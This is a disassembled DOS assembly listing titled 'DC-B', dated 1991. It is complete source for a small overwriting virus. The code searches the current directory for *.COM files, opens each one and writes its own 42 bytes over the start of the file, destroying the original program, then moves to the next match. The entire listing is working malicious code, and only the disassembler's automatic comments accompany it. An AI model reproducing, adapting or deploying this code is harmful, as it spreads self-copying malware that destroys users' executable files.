
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл								         лл
;лл			        DC-B				         лл
;лл								         лл
;лл      Created:   26-Dec-91					         лл
;лл      Passes:    5	       Analysis Options on: none	         лл
;лл								         лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

data_009E_e	equ	9Eh

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h


start:
		mov	ah,4Eh			; 'N'
		mov	dx,offset data_0124
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
loc_0107:
		mov	ax,3D01h
		mov	dx,data_009E_e
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx
		mov	ah,40h			; '@'
		mov	cl,2Ah			; '*'
		mov	dx,100h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_0107		; Jump if carry=0
		retn
data_0124	db	2Ah
		db	 2Eh, 43h, 4Fh, 4Dh, 00h


seg_a		ends



		end	start
